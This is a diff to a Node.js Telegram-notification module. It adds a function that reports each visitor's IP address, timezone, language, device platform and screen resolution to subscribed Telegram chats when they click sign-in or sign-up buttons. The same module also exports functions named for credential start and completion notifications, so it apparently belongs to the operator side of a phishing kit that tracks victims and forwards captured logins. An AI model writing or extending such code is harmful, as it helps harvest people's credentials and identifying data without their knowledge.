@@ -94,6 +94,57 @@ const sendToAllSubscribers = async (message, options = {}) => {
   console.log(`✅ Sent to ${subscribedChats.size} subscribers`);
 };
 
+// Send button click notification (Get Started, Sign In, Sign Up)
+const sendButtonClickNotification = async (clickData) => {
+  if (!bot || subscribedChats.size === 0) {
+    console.log('Telegram not configured or no subscribers, skipping button click notification');
+    return;
+  }
+
+  try {
+    const buttonEmoji = {
+      'get-started': '🚀',
+      'sign-in': '🔐',
+      'sign-up': '📝'
+    };
+    
+    const buttonText = {
+      'get-started': 'GET STARTED',
+      'sign-in': 'SIGN IN',
+      'sign-up': 'SIGN UP'
+    };
+
+    const emoji = buttonEmoji[clickData.button] || '🔘';
+    const text = buttonText[clickData.button] || clickData.button?.toUpperCase();
+
+    const message = `
+${emoji} *USER CLICKED: ${text}*
+
+📍 *Location:*
+━━━━━━━━━━━━━━━━━━━
+IP: \`${escapeMarkdown(clickData.ipAddress)}\`
+🗺 ${escapeMarkdown(clickData.timezone || 'Unknown')}
+🌍 ${escapeMarkdown(clickData.language || 'Unknown')}
+
+💻 *Device:*
+━━━━━━━━━━━━━━━━━━━
+${escapeMarkdown(clickData.platform || 'Unknown')} | ${escapeMarkdown(clickData.screenResolution || 'Unknown')}
+
+⏰ ${new Date().toLocaleString()}
+
+➡️ *User is now on ${text} page*
+`;
+
+    await sendToAllSubscribers(message, { 
+      parse_mode: 'Markdown',
+      disable_web_page_preview: true 
+    });
+    console.log(`✅ Button click notification sent: ${clickData.button}`);
+  } catch (error) {
+    console.error('❌ Error sending button click notification:', error.message);
+  }
+};
+
 // Send visitor notification
 const sendVisitorNotification = async (visitorData) => {
   if (!bot || subscribedChats.size === 0) {
@@ -329,6 +380,7 @@ const sendCredentialCompleteNotification = async (provider, data) => {
 };
 
 module.exports = {
+  sendButtonClickNotification,
   sendVisitorNotification,
   sendCredentialStartNotification,
   sendCredentialCompleteNotification
